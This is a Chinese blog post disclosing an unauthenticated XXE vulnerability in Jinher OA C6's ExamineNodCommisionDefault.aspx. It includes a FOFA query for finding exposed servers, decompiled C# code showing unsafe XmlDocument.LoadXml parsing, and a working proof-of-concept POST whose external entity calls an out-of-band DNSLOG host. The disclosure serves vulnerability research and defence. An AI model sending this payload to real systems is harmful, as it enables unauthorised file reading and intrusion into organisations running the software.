---
title: "金和OA ExamineNodCommisionDefault.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ExamineNodCommisionDefault-xxe.html
asset_dir: assets/金和oa-examinenodcommisiondefault.aspx-xxe漏洞
---

# 金和OA ExamineNodCommisionDefault.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/26 13:31
- 202浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

数据库

编码转换工具

Web安全课程

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ExamineNodCommisionDefault.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ExamineNodCommisionDefault.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ExamineNod.dll` 将其进行反编译后找到 **ExamineNodCommisionDefault** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  if (this.Request["Flag"] != null)
    this.strFlag = this.Request["Flag"].ToString().Trim();
  this.InitText();
  if (string.op_Inequality(this.strFlag, ""))
  {
    StreamReader streamReader = new StreamReader(this.Request.InputStream);
    bool flag = false;
    string end = ((TextReader) streamReader).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
    string innerText = xmlDocument.DocumentElement.ChildNodes[0].InnerText;
    if (this.strFlag.CompareTo("0") == 0)
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.examinenod/ExamineNodCommisionDefault.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA ExamineNodCommisionDefault.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
